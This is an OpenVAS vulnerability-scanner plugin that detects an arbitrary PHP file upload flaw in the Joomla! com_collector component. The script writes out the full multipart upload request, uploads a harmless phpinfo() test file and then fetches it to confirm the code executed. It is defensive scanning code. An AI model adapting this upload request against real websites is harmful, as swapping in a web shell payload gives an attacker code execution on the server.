##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_collector_comp_file_upload_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Joomla! com_collector Component Arbitrary File Upload Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to upload arbitrary PHP code
  and run it in the context of the Web server process.
  Impact Level: Application";

tag_affected = "Joomla! Collector Component";
tag_insight = "The flaw is due to the 'com_collector' component which allows to upload
  files with arbitrary extensions to a folder inside the webroot. This can be
  exploited to execute arbitrary PHP code by uploading a malicious PHP script.";
tag_solution = "No solution or patch is available as of 22nd January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://extensions.joomla.org/";
tag_summary = "This host is running Joomla! with com_collector component and is
  prone to file upload vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803213";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-01-22 15:07:32 +0530 (Tue, 22 Jan 2013)");
  script_name("Joomla! com_collector Component Arbitrary File Upload Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/89439");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24228");

  script_description(desc);
  script_summary("Check if the file is uploaded in Joomla");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## exit if safe checks enabled
if(safe_checks()){
  exit(0);
}

function upload_file(url, file, ex, len)
{
  return string(

  "POST ", url, " HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "Content-Type: multipart/form-data; boundary=---------------------------161994664612503670831257944673\r\n",
  "Content-Length: ", len, "\r\n\r\n",
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="foldername"\r\n\r\n\r\n',
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="fileupload"; filename="',file,'"\r\n',
  "Content-Type: application/octet-stream\r\n",
  "\r\n",
  ex,"\r\n",
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="option"\r\n\r\n',
  "com_collector\r\n",
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="view"\r\n\r\n',
  "filelist\r\n",
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="tmpl"\r\n\r\n',
  "component\r\n",
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="task"\r\n\r\n',
  "filemanager.upload\r\n",
  "-----------------------------161994664612503670831257944673\r\n",
  'Content-Disposition: form-data; name="folder"\r\n\r\n',
  "tmp\r\n",
  "-----------------------------161994664612503670831257944673--\r\n\r\n"
  );
}

## Variable Initialization
req = "";
res = "";
file = "";
url = "";
sndReq = "";
rcvRes = "";

joomlaPort = 0;

## Get HTTP Port
if(!joomlaPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:joomlaPort)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:joomlaPort))exit(0);

## Construct attack request
rand = rand();
file = string("ov-upload-test-", rand, ".php");
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 949;
url = string(dir, "/index.php?option=com_collector&view=filelist&folder=tmp&tmpl=component");
req = upload_file(url:url, file:file, ex:ex, len:len);

## Uploading File Containing Exploit
res = http_keepalive_send_recv(port:joomlaPort, data: req);

if(res)
{
  ## Get the contents of uploaded file
  path = string(dir, "/tmp/", file);

  sndReq = http_get(item:path, port:joomlaPort);
  rcvRes = http_send_recv(port:joomlaPort, data:sndReq);

  if(rcvRes && rcvRes =~ "HTTP/1.. 200" &&
    "<title>phpinfo()<" >< rcvRes && rand >< rcvRes)
   {
     security_hole(port:joomlaPort);
     exit(0);
   }
}
